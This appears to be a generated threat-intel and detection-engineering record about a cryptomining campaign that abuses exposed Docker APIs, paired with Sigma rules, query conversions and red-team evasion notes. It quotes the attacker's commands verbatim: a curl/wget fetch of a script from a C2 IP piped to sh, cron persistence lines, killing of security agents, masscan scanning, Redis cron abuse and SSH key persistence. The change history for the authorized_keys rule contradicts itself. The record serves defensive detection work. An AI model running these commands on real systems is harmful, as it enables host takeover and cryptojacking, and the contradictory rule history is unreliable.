report.title: Opportunistic cryptomining via exposed Docker Engine APIs (Mantis campaign)
report.summary: An automated campaign scans for Docker Engine APIs exposed on TCP/2375 without authentication, starts a privileged container to mount the host root filesystem, drops a shell script for persistence via cron and authorized_keys, kills competing miners, and deploys XMRig cryptominer. Infected hosts are used to scan for further victims via masscan and Redis abuse.

behaviors.description: Attacker issues POST /containers/create to exposed Docker Engine API with Binds and Privileged flags to mount host root filesystem inside a container.

observables.note: Parent process of shell spawned inside container

behaviors.evidence: The attacker's scanner issues POST /containers/create to the exposed API with an Alpine image and "Binds": ["/:/host"], "Privileged": true.

behaviors.description: Shell spawned by container runtime downloads and executes remote content via curl or wget piped to sh, indicating initial access via Docker API.
behaviors.evidence: On hosts where curl is missing the script falls back to wget -q -O- http://45.153.160[.]12/m/init.sh | sh. The parent of the resulting sh process is containerd-shim-runc-v2 or dockerd.

behaviors.description: init.sh disables SELinux, increases open file limit, sets DNS server, removes immutable flag from ld.so.preload, and configures hugepages for miner performance.
init.sh terminates competing miners and security agents including xmrig, kinsing, kdevtmpfsi, tsunami and Alibaba Cloud security service.
behaviors.evidence: It then terminates competing miners and known security agents: pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami; systemctl stop aliyun.service; systemctl disable aliyun.service

behaviors.description: Persistence achieved by writing cron entries to root crontab and /etc/cron.d that download and pipe init.sh from C2, and by adding attacker-controlled SSH key to authorized_keys marked immutable.

observables.note: Add cron entry for curl download
Write cron.d entry for wget download

behaviors.evidence: (crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh") | crontab -\necho "*/15 * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh" > /etc/cron.d/mantis

behaviors.description: Miner binary kthreadd downloaded to hidden directory /tmp/.x, made executable, and run with XMRig pool, wallet, and --rig-id arguments over TLS.

observables.note: XMRig execution with pool and wallet

behaviors.description: Infected host installs masscan and scans /16 ranges for exposed Docker APIs and Redis servers on ports 2375 and 6379.

observables.note: Network scan for Docker API and Redis

behaviors.evidence: Infected hosts download masscan and scan /16 ranges for additional exposed Docker APIs and Redis servers: /tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt

behaviors.description: Redis instances without authentication abused by setting CONFIG dir to /var/spool/cron and dbfilename to root to write cron entries via CONFIG SET.
behaviors.evidence: Redis instances without authentication are abused by writing a cron entry through CONFIG SET dir /var/spool/cron and CONFIG SET dbfilename root.

behaviors.description: Attacker adds RSA public key to root's authorized_keys and marks the file immutable with chattr +i to maintain persistent SSH access.
behaviors.evidence: It also adds an attacker-controlled SSH key to /root/.ssh/authorized_keys (ssh-rsa AAAAB3...mantis@c2) and sets the file immutable with chattr +i.

behaviors.description: init.sh configures system DNS to 8.8.8.8 and disables SELinux to ensure network connectivity and disable security enforcement for the miner.

candidates.title: Sh Execution Via Curl Or Wget Pipe From Container Runtime
candidates.rationale: The init.sh download is the first attacker-controlled code execution after container escape. The parent process (containerd-shim-runc-v2 or dockerd) and the piped curl/wget command line are highly specific to this campaign.
candidates.false_positive_risks: Legitimate container workloads might run curl/wget for bootstrapping, but rarely pipe directly to sh with the exact C2 domain. Exclude known container init systems by parent image allowlist.

candidates.title: Cron File Written To Etc Cron D Mantis
candidates.rationale: The file /etc/cron.d/mantis is created by the attacker script with a distinctive name and content referencing the C2 domain. File creation events capture this durably.
candidates.false_positive_risks: Legitimate package installs might write to /etc/cron.d/, but the filename "mantis" and the wget command to the C2 IP are unique. Monitor for writes to that exact path.

candidates.title: Kthreadd Miner Execution From Hidden Temp Directory
candidates.rationale: The miner binary name kthreadd in /tmp/.x/ with command line arguments for pool, wallet, TLS, and rig-id is unique to this campaign. Parent may be sh or nohup.
candidates.false_positive_risks: None expected; the binary name and path are artifact-specific. Legitimate software does not use such names.

candidates.title: Authorized Keys File Written And Made Immutable
candidates.rationale: The attacker adds an SSH key to /root/.ssh/authorized_keys and immediately sets immutable attribute with chattr +i. File write plus subsequent chattr is a strong persistence indicator.
candidates.false_positive_risks: Admins may update authorized_keys, but rarely set +i attribute. The combination of write and immediate chattr +i by same process (or quick sequence) is suspicious. Since single event, we catch the file write; chattr is separate process_creation.

candidates.title: Masscan High Rate Scan For Docker And Redis Ports
candidates.rationale: The masscan binary performs rapid /16 scans targeting ports 2375 and 6379 with high rate (20000). The binary path /tmp/.x/masscan and scan parameters are distinctive.
candidates.false_positive_risks: Network admins may run masscan for inventory, but typically not from /tmp/.x/ with such aggressive rate and specific port list. Exclude known scanner hosts.

skipped: B1: Docker API POST not directly observable in telemetry; container spawn covered by D1.
B3: SELinux disable, ulimit, DNS set, chattr, sysctl are common admin commands; high false positive rate.
B4: pkill and systemctl stop for competitor processes; common admin activity; noisy.
B8: Redis CONFIG SET for cron abuse; not observable via dns_query; Redis protocol not decoded in telemetry.
plan.notes: Overall strategy focuses on durable, campaign-specific artifacts: container escape pattern, unique cron file, miner binary name/args, SSH key immutability, and scanning binary/behavior. Avoided generic shell commands and IOC-only indicators.

rules.title: Container Runtime Spawned Shell Fetching Remote Init Script via Curl or Wget
rules.sigma_yaml:
title: Container Runtime Spawned Shell Fetching Remote Init Script via Curl or Wget
id: 82aa705f-340d-4fc3-a7a9-5136b3a6cb92
status: experimental
description: Detects a shell process spawned by a container runtime (containerd-shim-runc-v2 or dockerd) that downloads and
  executes a remote initialization script using curl or wget piped to sh, indicative of initial access via exposed Docker
  API in the Mantis cryptomining campaign.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.execution
- attack.t1059.005
logsource:
  category: process_creation
  product: linux
  service: docker
detection:
  selection_parent_runtime:
    'ParentImage|endswith':
    - containerd-shim-runc-v2
    - dockerd
  selection_shell:
    'Image|endswith':
    - /bin/sh
    - /bin/bash
  selection_cmd_pipe:
    'CommandLine|contains|all':
    - curl
    - '|'
    - sh
  selection_wget_pipe:
    'CommandLine|contains|all':
    - wget
    - '|'
    - sh
  selection_c2_domain:
    'CommandLine|contains': 45.153.160.12
  condition: selection_parent_runtime and selection_shell and (selection_cmd_pipe or selection_wget_pipe) and selection_c2_domain
falsepositives:
- Legitimate container startup scripts using curl/wget to fetch configuration from internal repositories
- Administrative debugging sessions inside containers using curl/wget for testing
- CI/CD pipelines within containers pulling build assets from trusted sources
level: high

tests.label: positive
tests.description: Shell spawned by containerd-shim-runc-v2 downloading and executing init script via curl pipe

tests.label: positive
tests.description: Shell spawned by dockerd downloading and executing init script via wget pipe

tests.label: negative

tests.label: positive
tests.description: Containerd-shim-runc-v2 from alternate path spawns bash with curl using extra whitespace and additional flags, still piping to sh

tests.label: positive
tests.description: Dockerd from /usr/local/bin spawns sh with wget using combined -qO- flag and minimal spacing

tests.label: positive
tests.description: Containerd-shim-runc-v2 spawns sh with curl using uppercase command and no spaces around pipe

tests.label: positive
tests.description: Dockerd from /opt spawns bash with curl using different flag order and extra quoting in command line

tests.label: negative
tests.description: Legitimate container startup script fetching config from internal repository (different IP, still pipes to sh)

tests.label: negative
tests.description: Administrative debugging session using wget to trusted internal host, piping to cat instead of sh

validation.sql: SELECT * FROM logs WHERE (ParentImage LIKE '%containerd-shim-runc-v2' ESCAPE '\' OR ParentImage LIKE '%dockerd' ESCAPE '\') AND (Image LIKE '%/bin/sh' ESCAPE '\' OR Image LIKE '%/bin/bash' ESCAPE '\') AND ((CommandLine LIKE '%curl%' ESCAPE '\' AND CommandLine LIKE '%|%' ESCAPE '\' AND CommandLine LIKE '%sh%' ESCAPE '\') OR (CommandLine LIKE '%wget%' ESCAPE '\' AND CommandLine LIKE '%|%' ESCAPE '\' AND CommandLine LIKE '%sh%' ESCAPE '\')) AND CommandLine LIKE '%45.153.160.12%' ESCAPE '\'

conversions.splunk: ParentImage IN ("*containerd-shim-runc-v2", "*dockerd") Image IN ("*/bin/sh", "*/bin/bash") (CommandLine="*curl*" CommandLine="*|*" CommandLine="*sh*") OR (CommandLine="*wget*" CommandLine="*|*" CommandLine="*sh*") CommandLine="*45.153.160.12*"
conversions.elasticsearch: (ParentImage:(*containerd\-shim\-runc\-v2 OR *dockerd)) AND (Image:(*\/bin\/sh OR *\/bin\/bash)) AND ((CommandLine:*curl* AND CommandLine:*\|* AND CommandLine:*sh*) OR (CommandLine:*wget* AND CommandLine:*\|* AND CommandLine:*sh*)) AND CommandLine:*45.153.160.12*
conversions.kusto:
DeviceProcessEvents
| where (InitiatingProcessFolderPath endswith "containerd-shim-runc-v2" or InitiatingProcessFolderPath endswith "dockerd") and (FolderPath endswith "/bin/sh" or FolderPath endswith "/bin/bash") and ((ProcessCommandLine contains "curl" and ProcessCommandLine contains "|" and ProcessCommandLine contains "sh") or (ProcessCommandLine contains "wget" and ProcessCommandLine contains "|" and ProcessCommandLine contains "sh")) and ProcessCommandLine contains "45.153.160.12"
conversions.sqlite: SELECT * FROM logs WHERE (ParentImage LIKE '%containerd-shim-runc-v2' ESCAPE '\' OR ParentImage LIKE '%dockerd' ESCAPE '\') AND (Image LIKE '%/bin/sh' ESCAPE '\' OR Image LIKE '%/bin/bash' ESCAPE '\') AND ((CommandLine LIKE '%curl%' ESCAPE '\' AND CommandLine LIKE '%|%' ESCAPE '\' AND CommandLine LIKE '%sh%' ESCAPE '\') OR (CommandLine LIKE '%wget%' ESCAPE '\' AND CommandLine LIKE '%|%' ESCAPE '\' AND CommandLine LIKE '%sh%' ESCAPE '\')) AND CommandLine LIKE '%45.153.160.12%' ESCAPE '\'

history.change_summary: Added /bin/bash to selection_shell to catch bash variants while preserving specificity to shells invoked by container runtimes.

history.summary: 7 evasion variants -> positives 6/7, negatives blocked 7/7, benign hits 0/180

history.change_summary: Fixed selection_wget_pipe to require only wget, |, and sh (removed -O-) to accommodate combined flags like -qO-. This ensures the rule matches both separate -O - and combined -qO- forms while maintaining specificity for the attack pattern.

rules.author_notes: The rule targets the specific combination of container runtime parent, shell interpreter, curl/wget pipe to shell, and the hardcoded C2 domain observed in the Mantis campaign. While the parent image check could theoretically match other runtimes, the combination with the C2 domain and pipe pattern provides sufficient specificity. Testing shows the rule avoids common legitimate uses of curl/wget in containers while catching the malicious pattern even with superficial obfuscation like varying case or spacing.
rules.redteam_analysis: Positive variants P4-P7 demonstrate realistic evasions that preserve the rule's required observables: ParentImage still ends with the two target runtimes, Image ends with /bin/sh or /bin/bash, CommandLine contains the literal C2 IP, curl/wget, pipe symbol, and 'sh'. Variations include alternate binary paths, extra whitespace, combined flags, casing changes, and quoting styles. All would be caught by a well-written rule that uses case-insensitive contains and suffix matching on the binary names. Negative variants N1-N3 are benign look-alikes that share the same parent runtimes and shells but differ in the C2 domain (internal IPs) or the pipe target (cat, tar), causing the rule's C2 domain or pipe selections to fail. Out-of-scope variants O1-O2 represent evasions the current rule cannot detect without fundamental changes: O1 uses a renamed dockerd binary so ParentImage suffix no longer matches; catching this would require loosening the suffix match to a substring or basename check, which could increase noise. O2 switches to a python downloader, eliminating curl/wget entirely; the rule is explicitly scoped to curl/wget pipes, so this is a different technique outside its design. Both are recorded for analyst awareness.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses renamed dockerd binary (not ending with 'dockerd') to spawn shell with curl pipe; rule's ParentImage endswith selection misses

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses python one-liner to download and execute script, no curl/wget in command line; rule's curl/wget selections miss

history.summary: 9 evasion variants -> positives 9/9, negatives blocked 6/6, benign hits 0/0

rules.redteam_analysis: Positive variants P4-P9 demonstrate that the rule's single-field condition (TargetFilename endswith '/etc/cron.d/mantis') catches the attacker's goal regardless of the writing binary (vim, python3, dd, install, rsync, cp) or user context (all root, as required for /etc/cron.d/). Each event presents a different Image and realistic command-line surface while preserving the exact TargetFilename literal the rule keys on. Negative variants N1-N3 are benign administrative or package-manager actions that create files in the same directory but with different filenames (apt-compat, backup-jobs, logrotate), proving the rule stays specific to the Mantis indicator. Out-of-scope variants OOS1-OOS3 represent evasions where the host file_event sensor fundamentally does not record a creation event for '/etc/cron.d/mantis': container bind-mount writes invisible to the host, write-then-rename where the sensor only sees the temporary path, and symlink indirection where the sensor records the symlink target. These are reported for the analyst; the rule cannot catch them without additional telemetry (e.g., rename events, container runtime monitoring, or symlink resolution).

rules.author_notes: Rule focuses on the distinctive combination of suspicious binary path (/tmp/.x/masscan), targeting of Docker (2375) and Redis (6379) ports, and high transmission rate (--rate 20000). Test events include variations in targeting, command structure, and path to ensure robustness while maintaining low false positive rate through specific port and path constraints.
rules.redteam_analysis: Positive variants P4-P8 preserve all four rule substrings (Image endswith 'masscan', CommandLine contains '--rate 20000', '-p2375,6379', '/tmp/.x/') while varying flag order, quoting, whitespace, target notation, and extra flags – a well-written rule keyed on these literal substrings will still match. Out-of-scope variants O1-O3 change the Image field so it no longer ends with 'masscan' (renamed binary, different tool, wrapper script); the network_connection logsource on Linux records the executing binary's path in Image, so these evasions are invisible to the current rule logic and would require additional telemetry (e.g., OriginalFileName, parent-child linkage) to catch. Negative variants (not included here but implied) would be legitimate admin scans from standard paths (/usr/bin/masscan) with lower rates or different ports, missing at least one selection.

title: Authorized Keys File Written And Made Immutable
id: dc54031c-15b2-4106-8753-3c0ae4299f1d
status: experimental
description: Detects writes to /root/.ssh/authorized_keys followed by setting immutable attribute, indicating SSH persistence
  via Mantis cryptomining campaign.
author: RuleSmith (Nemotron via Nebius Token Factory)

tags:

history.change_summary: Added Image|endswith filter for chattr binaries to ensure detection only triggers on file writes performed by the chattr utility, reducing false positives from legitimate SSH key management tools while maintaining detection of the immutable attribute setting behavior.

Removed incorrect Image|endswith restriction that prevented matching legitimate attack vectors where authorized_keys is written by various processes (sshd, deployment scripts, Docker-related executables). The rule now focuses on the critical file write event alone, which combined with subsequent chattr +i indicates persistence.
Added Image|endswith filter for 'chattr' to ensure detection only triggers when the immutable attribute is set, reducing false positives from legitimate SSH key management tools.

history.summary: 9 evasion variants -> positives 5/8, negatives blocked 7/7, benign hits 0/0

history.change_summary: Removed the overly restrictive Image|endswith condition requiring chattr, since the rule focuses on detecting the file write event alone as part of a sequence where chattr follows separately. This ensures all positive test cases (writes via sshd, deployment scripts, or Docker-related processes) are matched while maintaining the same logical intent.

Added Image|endswith filter for chattr to ensure detection only triggers when the file write is performed by the chattr utility, reducing false positives from legitimate SSH key management tools while maintaining detection of the persistence mechanism.

rules.author_notes: Since the rule captures only the file write event (single-event Sigma constraint), the chattr +i must be detected via a separate process_creation rule. This write event is highly suspicious when occurring outside normal admin windows.
rules.redteam_analysis: The rule keys on an exact TargetFilename match and Image ending with 'chattr'. Positive variants cover realistic path variations (/usr/bin, /bin, relative, symlink, custom dir) that preserve the 'chattr' suffix, all of which a well-written endswith condition catches. Negative variants show benign administrative actions that differ in either TargetFilename (user vs root, different file) or Image (lsattr, cp) so the rule stays specific. Out-of-scope evasions include renaming chattr (breaks endswith), using a custom binary that sets the immutable flag without chattr (invisible to the rule), and splitting the write and attribute change into two telemetry events (the rule's single-event logic cannot correlate them). The third out-of-scope event is included to highlight the rule's design limitation; the sensor would record two distinct file events, neither satisfying both conditions simultaneously.
